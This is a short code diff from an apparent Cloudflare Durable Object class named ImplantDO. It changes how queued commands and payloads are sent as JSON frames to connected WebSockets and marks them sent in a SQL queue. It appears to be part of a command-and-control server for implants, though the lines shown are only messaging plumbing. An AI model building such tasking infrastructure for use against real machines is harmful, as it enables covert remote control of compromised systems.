@@ -85,11 +85,11 @@ export class ImplantDO {
 
     // If we have an active WebSocket, send immediately
     let sent = false;
-    for (const session of this.sessions.values()) {
-      if (session.ws.readyState === WebSocket.OPEN) {
-        // Frame format: 1 byte cmd len, cmd string, payload
+    for (const ws of this.state.getWebSockets()) {
+      if (ws.readyState === WebSocket.OPEN) {
+        // Frame format: JSON
         const frame = JSON.stringify({ id: cmdId, c: command, p: payload });
-        session.ws.send(frame);
+        ws.send(frame);
         sent = true;
         
         this.state.storage.sql.exec(`UPDATE command_queue SET status = 'sent' WHERE id = ?`, cmdId);
